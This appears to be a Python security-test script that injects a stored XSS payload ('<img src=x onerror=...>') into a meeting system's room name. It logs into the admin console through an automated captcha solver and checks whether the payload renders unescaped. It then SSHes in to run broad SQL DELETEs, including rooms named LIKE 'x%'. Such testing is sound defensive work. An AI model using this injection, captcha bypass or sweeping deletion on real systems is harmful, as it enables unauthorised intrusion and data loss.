"""V8 P1：管理后台房间列表 存储型 XSS 渲染验证（UI 渲染 + DOM 检查）。
创建 secauto 测试房间（roomName 含 img payload），用 sysmanager 登录后台打开房间列表，检查原始/转义/DOM；结束清理。
"""
import sys as _sys
from pathlib import Path as _Path
_sys.path.insert(0, str(_Path(__file__).resolve().parents[1]))
from runner import public_config as _pub
import base64
import importlib.util
import json
import os
import sys
import time
import requests
import urllib3
urllib3.disable_warnings()
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BASE = _pub.target()
MODULE = os.path.join(ROOT, 'adapters', 'browser', 'admin_login.py')
OUT = os.path.join(ROOT, 'reports', 'final', 'xss_room_ui.json')
TOKEN = os.path.join(ROOT, 'evidence', 'tokens', 'admin02.txt')

def token():
    return open(TOKEN, encoding='utf-8').read().strip() if os.path.exists(TOKEN) else ''

def req(method, path, body=None):
    h = {'Origin': BASE, 'Referer': BASE + '/ui/login', 'User-Agent': 'Mozilla/5.0', 'token': token(), 'Content-Type': 'application/json'}
    r = requests.request(method, BASE + path, headers=h, params={'t': str(int(time.time() * 1000))}, json=body, timeout=20, verify=False)
    try:
        return (r.status_code, r.json())
    except Exception:
        return (r.status_code, {'raw': r.text[:200]})

def sql(sql):
    import paramiko
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(_pub.env('SEC_SSH_HOST', ''), 22, _pub.env('SEC_SSH_USER'), _pub.env('SEC_SSH_PASSWORD', ''), timeout=10)
    cmd = 'docker exec hst-mysql mysql -h192.168.7.155 -P22007 ' + ('-u' + _pub.shell('SEC_DB_USER')) + ' -' + _pub.shell('SEC_TEST_PASSWORD') + ' --ssl-mode=REQUIRED fastmeeting -N -e ' + json.dumps(sql) + ' 2>/dev/null'
    (i, o, e) = c.exec_command(cmd, timeout=60)
    out = o.read().decode('utf-8', 'replace') + e.read().decode('utf-8', 'replace')
    c.close()
    return out.strip()

def main():
    payload = '<img src=x onerror="window.__xss=1">'
    room = 'x' + payload
    (st, j) = req('GET', '/meeting/v1/roominfo/default')
    template = (j or {}).get('data') or {}
    body = dict(template)
    body['roomName'] = room
    (st, j) = req('POST', '/meeting/v1/roominfo/add', body)
    result = {'generated_at': time.strftime('%Y-%m-%dT%H:%M:%S'), 'payload': payload, 'roomName': room, 'create_http': st, 'create_code': (j or {}).get('code'), 'create_msg': (j or {}).get('msg')}
    if result['create_code'] != '0':
        payload = '<img src=x onerror=window.__xss=1>'
        room = 'x' + payload
        body['roomName'] = room
        (st, j) = req('POST', '/meeting/v1/roominfo/add', body)
        result.update({'payload': payload, 'roomName': room, 'create_http': st, 'create_code': (j or {}).get('code'), 'create_msg': (j or {}).get('msg')})
    rid = None
    try:
        if result['create_code'] == '0':
            (st, j) = req('POST', '/meeting/v1/roominfo/page', {'pageNumber': 1, 'pageSize': 200})
            for rec in ((j or {}).get('data') or {}).get('records') or []:
                if rec.get('roomName') == room:
                    rid = rec.get('roomID')
            result['roomID'] = rid
            spec = importlib.util.spec_from_file_location('al', MODULE)
            al = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(al)
            from playwright.sync_api import sync_playwright
            pwd = os.environ.get('SEC_BACKEND_PASS', '')
            chrome = al.find_chrome('')
            solver = al.CaptchaSolver()
            checks = {}
            with sync_playwright() as p:
                b = p.chromium.launch(headless=True, executable_path=chrome, args=['--ignore-certificate-errors', '--no-sandbox'])
                ctx = b.new_context(ignore_https_errors=True, viewport={'width': 1600, 'height': 950})
                page = ctx.new_page()
                for attempt in range(1, 5):
                    page.goto(BASE + '/?r=%d#/ui/login' % attempt, wait_until='networkidle', timeout=60000)
                    page.wait_for_timeout(1500)
                    try:
                        page.fill('input[placeholder*="用户名"]', 'sysmanager')
                        page.fill('input[type="password"]', pwd)
                        page.click('button:has-text("登")')
                    except Exception:
                        continue
                    try:
                        page.wait_for_selector(al.CAPTCHA_SELECTOR, timeout=25000)
                        page.wait_for_timeout(600)
                        src = ''
                        imgs = page.locator(al.CAPTCHA_SELECTOR)
                        for i in range(imgs.count()):
                            s = imgs.nth(i).get_attribute('src') or ''
                            if len(s) > len(src):
                                src = s
                        img = base64.b64decode(src.split(',', 1)[1])
                        (boxes, size) = solver.solve(img)
                        txt = page.inner_text('body')
                        m = al.TARGET_RE.search(txt)
                        target = al.HANZI_RE.sub('', m.group(1)) if m else ''
                        pts = al.match_points(target, boxes) if target else None
                        if not pts or len(pts) != len(target):
                            continue
                        al.click_points(page, pts, size)
                        page.wait_for_timeout(5000)
                        break
                    except Exception:
                        continue
                try:
                    page.goto(BASE + '/#/ui/conference-management/conference-room-info', wait_until='domcontentloaded', timeout=30000)
                    page.wait_for_timeout(3000)
                    for sel in ('input[placeholder*="会议室"]', 'input[placeholder*="名称"]', 'input[placeholder*="搜索"]'):
                        try:
                            page.fill(sel, room)
                            page.keyboard.press('Enter')
                            break
                        except Exception:
                            continue
                    page.wait_for_timeout(7000)
                    html = page.content()
                    checks['page_contains_payload'] = payload in html
                    checks['page_contains_escaped'] = '&lt;img' in html.lower()
                    checks['page_url'] = page.url
                    try:
                        checks['dom_img_count'] = page.evaluate('document.querySelectorAll(\'img[src="x"]\').length')
                        checks['window_xss'] = page.evaluate('window.__xss || 0')
                    except Exception as e:
                        checks['dom_error'] = str(e)[:150]
                    if checks.get('page_contains_payload') and (not checks.get('page_contains_escaped')):
                        checks['verdict'] = 'POSSIBLE_XSS'
                    elif checks.get('page_contains_escaped'):
                        checks['verdict'] = 'ESCAPED'
                    else:
                        checks['verdict'] = 'NOT_RENDERED'
                finally:
                    b.close()
            result['checks'] = checks
    finally:
        try:
            sql("DELETE FROM t_roomusers WHERE roomID IN (SELECT roomID FROM t_roominfo WHERE roomName LIKE 'x%');DELETE FROM t_roominfo WHERE roomName LIKE 'x%';")
            result['cleanup'] = True
        except Exception as e:
            result['cleanup'] = False
            result['cleanup_error'] = str(e)[:150]
    json.dump(result, open(OUT, 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
    print(json.dumps({k: result.get(k) for k in ('create_code', 'roomID', 'checks', 'cleanup')}, ensure_ascii=False))
if __name__ == '__main__':
    main()
